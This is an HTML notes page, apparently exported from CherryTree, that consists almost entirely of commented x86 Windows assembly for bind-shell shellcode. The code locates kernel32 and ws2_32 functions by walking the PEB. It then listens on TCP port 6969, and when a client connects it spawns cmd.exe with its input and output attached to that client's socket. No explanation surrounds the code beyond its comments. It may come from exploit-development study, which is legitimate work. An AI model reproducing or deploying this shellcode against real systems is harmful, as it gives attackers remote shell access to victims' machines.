<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ASM file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">ASM file</h1><br/><div class="codebox"><div class="codebox">section&nbsp;.text<br />	global&nbsp;_start<br />_start:<br /><br />;&nbsp;Search&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;image&nbsp;base&nbsp;address&nbsp;of&nbsp;kernel32.dll&nbsp;via&nbsp;PEB,&nbsp;GetModuleHandle<br />xor&nbsp;ecx,ecx<br />mov&nbsp;eax,[fs:ecx+<span style="color:#ff0044;font-weight:400">0x30</span>]&nbsp;				;&nbsp;PEB<br />mov&nbsp;eax,[eax+<span style="color:#ff0044;font-weight:400">0xc</span>]&nbsp;				;&nbsp;PEB.Ldr<br />mov&nbsp;esi,[eax+<span style="color:#ff0044;font-weight:400">0x14</span>]&nbsp;				;&nbsp;PEB.Ldr-&gt;InMemOrderModuleList<br />lodsd<br />xchg&nbsp;esi,eax<br />lodsd<br />;&nbsp;Find&nbsp;functions<br />mov&nbsp;edi,[eax+<span style="color:#ff0044;font-weight:400">0x10</span>]&nbsp;				;&nbsp;kernel32.dll&nbsp;base&nbsp;address<br />mov&nbsp;ebx,[edi+<span style="color:#ff0044;font-weight:400">0x3c</span>]&nbsp;				;&nbsp;DOS-&gt;elf_anew<br />add&nbsp;ebx,edi&nbsp;					;&nbsp;PE&nbsp;HEADER<br />mov&nbsp;ebx,[ebx+<span style="color:#ff0044;font-weight:400">0x78</span>]&nbsp;				;&nbsp;Copy&nbsp;RVA&nbsp;of&nbsp;Export&nbsp;directory&nbsp;in&nbsp;EBX<br />add&nbsp;ebx,edi&nbsp;					;&nbsp;kernel32&nbsp;IMAGE_EXPORT_DIRECTORY<br />sub&nbsp;esp,<span style="color:#ff0044;font-weight:400">32</span><br />lea&nbsp;esi,[esp]<br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">660</span><br />mov&nbsp;edx,[ebx+<span style="color:#ff0044;font-weight:400">0x1c</span>]&nbsp;				;&nbsp;AddressOfFunctions<br />add&nbsp;edx,edi<br />mov&nbsp;eax,[edx+ecx]<br />add&nbsp;eax,edi&nbsp;<br />mov&nbsp;[esi],dword&nbsp;eax&nbsp;				;&nbsp;CreateProcessA()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">1128</span><br />mov&nbsp;eax,[edx+ecx]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">4</span>],dword&nbsp;eax&nbsp;				;&nbsp;ExitProcess()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">4</span><br /><br />;------------------------------------<br />;&nbsp;Finding&nbsp;base&nbsp;address&nbsp;of&nbsp;ws2_32.dll<br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">3312</span>					;&nbsp;RVA&nbsp;buffer<br />mov&nbsp;eax,[edx+ecx]				;&nbsp;Relative&nbsp;calculcate&nbsp;offset&nbsp;via&nbsp;AddressOfFunctions<br />add&nbsp;eax,edi					;&nbsp;Increment&nbsp;address&nbsp;resulting&nbsp;in&nbsp;LoadLibraryA&nbsp;function&nbsp;address<br />xor&nbsp;ecx,ecx					;&nbsp;Clear&nbsp;reg<br /><br />;&nbsp;HMODULE&nbsp;LoadLibraryA(<br />;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpLibFileName<br />;&nbsp;);<br />push&nbsp;<span style="color:#ff0044;font-weight:400">0x41416c6c</span>					;&nbsp;<span style="color:#3ad900;font-weight:400">"llAA"</span><br />mov&nbsp;[esp+<span style="color:#ff0044;font-weight:400">2</span>],word&nbsp;cx				<br />push&nbsp;<span style="color:#ff0044;font-weight:400">0x642e3233</span>					;&nbsp;<span style="color:#3ad900;font-weight:400">"32.d"</span><br />push&nbsp;<span style="color:#ff0044;font-weight:400">0x5f327377</span>					;&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_"</span><br />lea&nbsp;ebx,[esp]					;&nbsp;Load&nbsp;string&nbsp;pointer&nbsp;reference&nbsp;in&nbsp;EBX<br />push&nbsp;ebx					;&nbsp;lpLibFileName<br />call&nbsp;eax					;&nbsp;Call&nbsp;function<br />mov&nbsp;edi,eax					;&nbsp;Result&nbsp;of&nbsp;function&nbsp;in&nbsp;EAX,&nbsp;DLL&nbsp;Handle&nbsp;copied&nbsp;to&nbsp;EDI&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;further&nbsp;reference<br /><br />;&nbsp;Parsing&nbsp;the&nbsp;DLL,&nbsp;walk&nbsp;the&nbsp;functions&nbsp;of&nbsp;ws2_32.dll<br />mov&nbsp;ebx,[edi+<span style="color:#ff0044;font-weight:400">0x3c</span>]&nbsp;				;&nbsp;DOS-&gt;elf_anew<br />add&nbsp;ebx,edi&nbsp;					;&nbsp;PE&nbsp;HEADER<br />mov&nbsp;ebx,[ebx+<span style="color:#ff0044;font-weight:400">0x78</span>]&nbsp;				;&nbsp;Offset&nbsp;Export&nbsp;Table<br />add&nbsp;ebx,edi&nbsp;					;&nbsp;ws2_32.dll&nbsp;IMAGE_EXPORT_DIRECTORY<br />mov&nbsp;edx,[ebx+<span style="color:#ff0044;font-weight:400">0x1c</span>]&nbsp;				;&nbsp;AddressOfFunctions<br />add&nbsp;edx,edi					;&nbsp;Names&nbsp;Table<br />xor&nbsp;ecx,ecx<br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">456</span><br />mov&nbsp;eax,[edx+ecx]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">8</span>],dword&nbsp;eax&nbsp;				;&nbsp;WSAStartup()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">8</span><br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">392</span><br />mov&nbsp;eax,[edx+ecx]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">12</span>],dword&nbsp;eax&nbsp;				;&nbsp;WSASocketA()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">12</span><br />mov&nbsp;eax,[edx+<span style="color:#ff0044;font-weight:400">4</span>]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">16</span>],dword&nbsp;eax&nbsp;				;&nbsp;bind()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">16</span><br />mov&nbsp;eax,[edx+<span style="color:#ff0044;font-weight:400">48</span>]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">20</span>],dword&nbsp;eax&nbsp;				;&nbsp;listen()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">20</span><br />mov&nbsp;eax,[edx]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">24</span>],dword&nbsp;eax&nbsp;				;&nbsp;accept()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">24</span><br />mov&nbsp;eax,[edx+<span style="color:#ff0044;font-weight:400">80</span>]<br />add&nbsp;eax,edi<br />mov&nbsp;[esi+<span style="color:#ff0044;font-weight:400">28</span>],dword&nbsp;eax&nbsp;				;&nbsp;setsockopt()&nbsp;at&nbsp;offset&nbsp;<span style="color:#ff0044;font-weight:400">28</span><br /><br />;-------------------------------------------------<br />	;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;WSAStartup(<br />	;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wVersionRequired,<br />	;&nbsp;&nbsp;&nbsp;LPWSADATA&nbsp;lpWSAData<br />	;&nbsp;);<br />;&nbsp;WSAStartup(<span style="color:#ff0044;font-weight:400">514</span>,&nbsp;&amp;WSADATA)<br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">400</span>					;&nbsp;Reserve&nbsp;space&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;WSADATA<br />sub&nbsp;esp,ecx<br />lea&nbsp;ebx,[esp]					;&nbsp;Load&nbsp;PTR&nbsp;in&nbsp;EBX<br />mov&nbsp;cx,<span style="color:#ff0044;font-weight:400">514</span>					;&nbsp;wVersionRequired<br />push&nbsp;ebx<br />push&nbsp;ecx<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">8</span>]				;&nbsp;Call&nbsp;function<br /><br />;-----------------------------------------<br />	;&nbsp;SOCKET&nbsp;WSAAPI&nbsp;WSASocketA(<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;af,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protocol,<br />	;&nbsp;&nbsp;&nbsp;LPWSAPROTOCOL_INFOA&nbsp;lpProtocolInfo,<br />	;&nbsp;&nbsp;&nbsp;GROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g,<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwFlags<br />	;&nbsp;);	<br />;&nbsp;WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#0088ff;font-weight:700">NULL</span>)<br />xor&nbsp;ecx,ecx<br />push&nbsp;ecx<br />push&nbsp;ecx<br />push&nbsp;ecx<br />mov&nbsp;cl,<span style="color:#ff0044;font-weight:400">6</span><br />push&nbsp;ecx					;&nbsp;IPPROTO_TCP&nbsp;<span style="color:#ff0044;font-weight:400">6</span><br />sub&nbsp;ecx,<span style="color:#ff0044;font-weight:400">5</span><br />push&nbsp;ecx					;&nbsp;Type&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;&nbsp;SOCK_STREAM&nbsp;(TCP)<br />inc&nbsp;ecx						<br />push&nbsp;ecx					;&nbsp;AF_INET&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">2</span><br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">12</span>]				;&nbsp;Call&nbsp;function<br />mov&nbsp;edi,eax&nbsp;					;&nbsp;Copy&nbsp;result&nbsp;of&nbsp;function&nbsp;in&nbsp;EAX&nbsp;in&nbsp;EDI&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;SOCKET,&nbsp;to&nbsp;be&nbsp;used&nbsp;in&nbsp;setsockopt<br /><br />;----------------------------------<br />	;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;setsockopt(<br />	;&nbsp;&nbsp;&nbsp;SOCKET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;level,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;optname,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*optval,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;optlen<br />	;&nbsp;);<br />;&nbsp;setsockopt(sock,<span style="color:#ff0044;font-weight:400">0xffff</span>,<span style="color:#ff0044;font-weight:400">4</span>,&amp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;l=<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#7f0044;font-weight:400">int</span>&nbsp;j=<span style="color:#ff0044;font-weight:400">2</span>)<br />cdq<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">2</span><br />push&nbsp;edx<br />dec&nbsp;edx<br />push&nbsp;edx<br />lea&nbsp;ecx,[esp]<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">4</span><br />push&nbsp;ecx<br />push&nbsp;edx<br />mov&nbsp;dx,<span style="color:#ff0044;font-weight:400">0xffff</span><br />push&nbsp;edx<br />push&nbsp;edi<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">28</span>]<br /><br />;--------------------------------------------<br />	;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;bind(<br />	;&nbsp;&nbsp;&nbsp;SOCKET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;sockaddr&nbsp;*addr,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;namelen<br />	;&nbsp;);<br />;&nbsp;bind(SOCKET,(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in,<span style="color:#ff0044;font-weight:400">16</span>);<br />cdq<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />mov&nbsp;[esp],byte&nbsp;<span style="color:#ff0044;font-weight:400">2</span><br />mov&nbsp;[esp+<span style="color:#ff0044;font-weight:400">2</span>],word&nbsp;<span style="color:#ff0044;font-weight:400">0x391b</span>&nbsp;			;&nbsp;port&nbsp;<span style="color:#ff0044;font-weight:400">6969</span><br />lea&nbsp;ecx,[esp]<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">16</span><br />push&nbsp;edx<br />push&nbsp;ecx<br />push&nbsp;edi<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">16</span>]				;&nbsp;Call&nbsp;function<br /><br />;--------------------------------<br />	;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;WSAAPI&nbsp;listen(<br />	;&nbsp;&nbsp;&nbsp;SOCKET&nbsp;s,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;backlog<br />	;&nbsp;);<br />	;&nbsp;listen(SOCKET,<span style="color:#ff0044;font-weight:400">1</span>);<br />cdq<br />inc&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edi<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">20</span>]				;&nbsp;Call&nbsp;function<br /><br />;-----------------------------<br />	;&nbsp;SOCKET&nbsp;WSAAPI&nbsp;accept(<br />	;&nbsp;&nbsp;&nbsp;SOCKET&nbsp;&nbsp;&nbsp;s,<br />	;&nbsp;&nbsp;&nbsp;sockaddr&nbsp;*addr,<br />	;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*addrlen<br />	;&nbsp;);<br />;&nbsp;accept(SOCKET,(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in,&amp;<span style="color:#ff0044;font-weight:400">16</span>);<br />cdq<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">16</span><br />lea&nbsp;ecx,[esp]<br />push&nbsp;edx<br />lea&nbsp;ebx,[esp]<br />push&nbsp;ebx<br />push&nbsp;ecx<br />push&nbsp;edi<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">24</span>]				;&nbsp;Call&nbsp;function<br />mov&nbsp;edi,eax&nbsp;					;&nbsp;Copy&nbsp;result&nbsp;of&nbsp;function&nbsp;in&nbsp;EAX&nbsp;to&nbsp;EDI&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;Client&nbsp;socket<br /><br />;-----------------------<br />	;&nbsp;<span style="color:#ff9d00;font-weight:700">typedef</span>&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;_PROCESS_INFORMATION&nbsp;{<br />	;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProcess;<br />	;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hThread;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwProcessId;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwThreadId;<br />	;&nbsp;}&nbsp;PROCESS_INFORMATION,&nbsp;*PPROCESS_INFORMATION,&nbsp;*LPPROCESS_INFORMATION;<br />cdq<br />sub&nbsp;esp,<span style="color:#ff0044;font-weight:400">16</span><br />lea&nbsp;ebx,[esp]&nbsp;				;&nbsp;PROCESS_INFORMATION<br /><br />	;&nbsp;<span style="color:#ff9d00;font-weight:700">typedef</span>&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;_STARTUPINFOA&nbsp;{<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;cb;<br />	;&nbsp;&nbsp;&nbsp;LPSTR&nbsp;&nbsp;lpReserved;<br />	;&nbsp;&nbsp;&nbsp;LPSTR&nbsp;&nbsp;lpDesktop;<br />	;&nbsp;&nbsp;&nbsp;LPSTR&nbsp;&nbsp;lpTitle;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwX;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwY;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwXSize;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwYSize;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwXCountChars;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwYCountChars;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwFillAttribute;<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;dwFlags;<br />	;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;wShowWindow;<br />	;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;cbReserved2;<br />	;&nbsp;&nbsp;&nbsp;LPBYTE&nbsp;lpReserved2;<br />	;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hStdInput;<br />	;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hStdOutput;<br />	;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hStdError;<br />	;&nbsp;}&nbsp;STARTUPINFOA,&nbsp;*LPSTARTUPINFOA;	<br />push&nbsp;edi<br />push&nbsp;edi<br />push&nbsp;edi<br />push&nbsp;edx<br />push&nbsp;edx<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">255</span><br />inc&nbsp;edx<br />push&nbsp;edx<br />cdq<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />mov&nbsp;dl,<span style="color:#ff0044;font-weight:400">68</span><br />push&nbsp;edx<br />lea&nbsp;ecx,[esp]&nbsp;				;&nbsp;STARTUPINFOA<br />cdq<br />push&nbsp;<span style="color:#ff0044;font-weight:400">0x41657865</span>				;&nbsp;<span style="color:#3ad900;font-weight:400">"exeA"</span><br />mov&nbsp;[esp+<span style="color:#ff0044;font-weight:400">3</span>],byte&nbsp;dl<br />push&nbsp;<span style="color:#ff0044;font-weight:400">0x2e646d63</span>&nbsp;			;&nbsp;<span style="color:#3ad900;font-weight:400">"cmd."</span><br />lea&nbsp;eax,[esp]<br /><br />;---------------------------------------------<br />	;&nbsp;BOOL&nbsp;CreateProcessA(<br />	;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpApplicationName,<br />	;&nbsp;&nbsp;&nbsp;LPSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpCommandLine,<br />	;&nbsp;&nbsp;&nbsp;LPSECURITY_ATTRIBUTES&nbsp;lpProcessAttributes,<br />	;&nbsp;&nbsp;&nbsp;LPSECURITY_ATTRIBUTES&nbsp;lpThreadAttributes,<br />	;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bInheritHandles,<br />	;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwCreationFlags,<br />	;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpEnvironment,<br />	;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpCurrentDirectory,<br />	;&nbsp;&nbsp;&nbsp;LPSTARTUPINFOA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpStartupInfo,<br />	;&nbsp;&nbsp;&nbsp;LPPROCESS_INFORMATION&nbsp;lpProcessInformation<br />	;&nbsp;);<br />;&nbsp;CreateProcessA(<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#3ad900;font-weight:400">"cmd.exe"</span>,<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#0088ff;font-weight:700">TRUE</span>,<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:700">NULL</span>,<span style="color:#0088ff;font-weight:700">NULL</span>,&amp;STARTUPINFOA,&amp;PROCESS_INFORMATION)<br />push&nbsp;ebx<br />push&nbsp;ecx<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;edx<br />inc&nbsp;edx<br />push&nbsp;edx<br />cdq<br />push&nbsp;edx<br />push&nbsp;edx<br />push&nbsp;eax<br />push&nbsp;edx<br />call&nbsp;dword&nbsp;[esi]<br /><br />;-----------------------<br />	;&nbsp;ExitProcess(<span style="color:#ff0044;font-weight:400">0</span>)<br />	;&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;ExitProcess(<br />	;&nbsp;&nbsp;UINT&nbsp;uExitCode<br />	;&nbsp;);<br />;&nbsp;ExitProcess(<span style="color:#ff0044;font-weight:400">0</span>)<br />push&nbsp;eax<br />call&nbsp;dword&nbsp;[esi+<span style="color:#ff0044;font-weight:400">4</span>]<br /></div></div></div></body></html>